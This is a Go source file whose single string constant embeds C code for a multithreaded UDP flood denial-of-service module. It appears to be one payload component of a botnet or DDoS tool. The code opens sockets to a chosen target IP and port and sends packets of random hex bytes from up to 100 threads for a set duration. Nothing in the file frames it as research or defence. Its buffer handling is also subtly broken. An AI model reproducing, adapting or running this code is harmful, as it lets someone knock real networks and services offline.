package payloads

var UDPHex = `
// ==================== UDP HEX FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static int udp_hex_running = 0;
static pthread_t udp_hex_threads[100];

static const char *udp_hex_array[] = {
    "\x00", "\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x09",
    "\x0a", "\x0b", "\x0c", "\x0d", "\x0e", "\x0f", "\x10", "\x11", "\x12", "\x13",
    "\x14", "\x15", "\x16", "\x17", "\x18", "\x19", "\x1a", "\x1b", "\x1c", "\x1d",
    "\x1e", "\x1f", "\x20", "\x21", "\x22", "\x23", "\x24", "\x25", "\x26", "\x27",
    "\x28", "\x29", "\x2a", "\x2b", "\x2c", "\x2d", "\x2e", "\x2f", "\x30", "\x31",
    "\x32", "\x33", "\x34", "\x35", "\x36", "\x37", "\x38", "\x39", "\x3a", "\x3b",
    "\x3c", "\x3d", "\x3e", "\x3f", "\x40", "\x41", "\x42", "\x43", "\x44", "\x45",
    "\x46", "\x47", "\x48", "\x49", "\x4a", "\x4b", "\x4c", "\x4d", "\x4e", "\x4f",
    "\x50", "\x51", "\x52", "\x53", "\x54", "\x55", "\x56", "\x57", "\x58", "\x59",
    "\x5a", "\x5b", "\x5c", "\x5d", "\x5e", "\x5f", "\x60", "\x61", "\x62", "\x63",
    "\x64", "\x65", "\x66", "\x67", "\x68", "\x69", "\x6a", "\x6b", "\x6c", "\x6d",
    "\x6e", "\x6f", "\x70", "\x71", "\x72", "\x73", "\x74", "\x75", "\x76", "\x77",
    "\x78", "\x79", "\x7a", "\x7b", "\x7c", "\x7d", "\x7e", "\x7f", "\x80", "\x81",
    "\x82", "\x83", "\x84", "\x85", "\x86", "\x87", "\x88", "\x89", "\x8a", "\x8b",
    "\x8c", "\x8d", "\x8e", "\x8f", "\x90", "\x91", "\x92", "\x93", "\x94", "\x95",
    "\x96", "\x97", "\x98", "\x99", "\x9a", "\x9b", "\x9c", "\x9d", "\x9e", "\x9f",
    "\xa0", "\xa1", "\xa2", "\xa3", "\xa4", "\xa5", "\xa6", "\xa7", "\xa8", "\xa9",
    "\xaa", "\xab", "\xac", "\xad", "\xae", "\xaf", "\xb0", "\xb1", "\xb2", "\xb3",
    "\xb4", "\xb5", "\xb6", "\xb7", "\xb8", "\xb9", "\xba", "\xbb", "\xbc", "\xbd",
    "\xbe", "\xbf", "\xc0", "\xc1", "\xc2", "\xc3", "\xc4", "\xc5", "\xc6", "\xc7",
    "\xc8", "\xc9", "\xca", "\xcb", "\xcc", "\xcd", "\xce", "\xcf", "\xd0", "\xd1",
    "\xd2", "\xd3", "\xd4", "\xd5", "\xd6", "\xd7", "\xd8", "\xd9", "\xda", "\xdb",
    "\xdc", "\xdd", "\xde", "\xdf", "\xe0", "\xe1", "\xe2", "\xe3", "\xe4", "\xe5",
    "\xe6", "\xe7", "\xe8", "\xe9", "\xea", "\xeb", "\xec", "\xed", "\xee", "\xef",
    "\xf0", "\xf1", "\xf2", "\xf3", "\xf4", "\xf5", "\xf6", "\xf7", "\xf8", "\xf9",
    "\xfa", "\xfb", "\xfc", "\xfd", "\xfe", "\xff"};

void *udp_hex_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    int length = *(int *)((char *)arg + 72);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    
    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(rand() & 0xFFFF);
    bind_addr.sin_addr.s_addr = 0;
    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    
    connect(fd, (struct sockaddr *)&sin, sizeof(sin));
    
    time_t start = time(NULL);
    
    while (udp_hex_running && time(NULL) - start < duration) {
        int idx = rand() % 256;
        const char *payload = udp_hex_array[idx];
        send(fd, payload, length, MSG_NOSIGNAL);
    }
    
    close(fd);
    return NULL;
}

void start_udp_hex_attack(char *target, int port, int threads, int duration_sec, int length) {
    if (udp_hex_running) return;
    udp_hex_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    *((int *)(arg + 72)) = length;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&udp_hex_threads[i], NULL, udp_hex_flood, arg);
    }
    
    sleep(duration_sec);
    udp_hex_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(udp_hex_threads[i], NULL);
    }
    free(arg);
}

void stop_udp_hex_attack() { udp_hex_running = 0; }
// ==================== END UDP HEX MODULE ====================
`